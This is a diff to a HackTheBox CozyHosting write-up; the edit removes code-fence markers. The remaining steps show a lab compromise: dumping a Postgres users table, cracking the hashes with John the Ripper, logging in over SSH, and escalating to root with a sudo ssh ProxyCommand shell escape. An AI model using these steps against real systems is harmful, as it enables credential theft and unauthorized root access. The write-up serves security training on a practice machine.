@@ -111,32 +111,32 @@ after inspecting we can find that it contains postgres database credentials like
 
 ```
 psql -h 127.0.0.1 -U postgres
-``````
+
 \\c cozyhosting
-``````
+
 \\d #to list availabe databases
-```
+
 ![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/c7d07dc7-f747-413d-b30a-b5511df006b4)
 
-```
+
 
 select \* from users; #To select all data in the users database
 
-```
+
 ![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/2032451d-df9e-4898-8a5a-75523888c34c)
 
 the passwords is hashed, we can try to crack it using john the ripper, with the following command, pointing to the wordlist to use ( in this case rockyou.txt will be sufficient )
 
-```
+
 john hash.txt --wordlist=/home/zeronull/rockyou.txt
-```
+
 ![image](https://github.com/ahmedgomaaa/HackTheBox-Writeups/assets/37199252/d0966515-7398-4b64-a993-8df4d8349f9b)
 
 now we can try to use this password to ssh into the machine using the user josh
 
-```
+
 ssh josh@10.10.11.230 
-```
+
 
 And we succesfully log in with the user josh, and we can access his directory, and access the user flag.txt
 
@@ -160,9 +160,9 @@ we find:
 
 and by running
 
-```
+
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
-```
+
 
 we get our root access successfully.
 
